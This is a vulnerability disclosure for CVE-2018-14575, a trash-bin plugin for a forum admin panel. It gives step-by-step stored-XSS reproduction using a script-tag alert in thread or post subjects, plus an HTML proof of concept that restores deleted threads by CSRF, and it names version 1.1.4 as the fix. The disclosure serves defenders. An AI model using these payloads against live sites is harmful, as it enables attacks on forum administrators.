# CVE: CVE-2018-14575


1. Description:
Creates a trash bin in the ACP where you can recover permanent deleted threads and posts. The thread/post subjects allow XSS and deleted posts can be restored by CSRF.


2. Proof of Concept:

Cross-Site Scripting

- Create a new thread with the following subject  <script>alert('XSS')</script>
- Permanently delete that thread
- Alert is located in threads trash bin localhost/[path]/admin/index.php?module=tools-trashbin and localhost/admin/index.php?module=tools-trashbin&action=posts

- Reply to a post and change the subject to the following  <script>alert('XSS')</script>
- Permanently delete that post
- Alert is located in posts trash bin localhost/[path]/admin/index.php?module=tools-trashbin&action=posts


Cross-Site Request Forgery

<html>
	<body>
		<!-- Restore deleted threads & posts by thread/post ID -->
		<div class="popup_item_container"><a href="http://localhost/[path]/admin/index.php?module=tools-trashbin&action=threadrestore&tid=1" class="popup_item">Restore</a></div>
		<script type="text/javascript">
			$("#thread_1").popupMenu();
		</script>
	</body>
</html>

3. Solution:
Update to 1.1.4
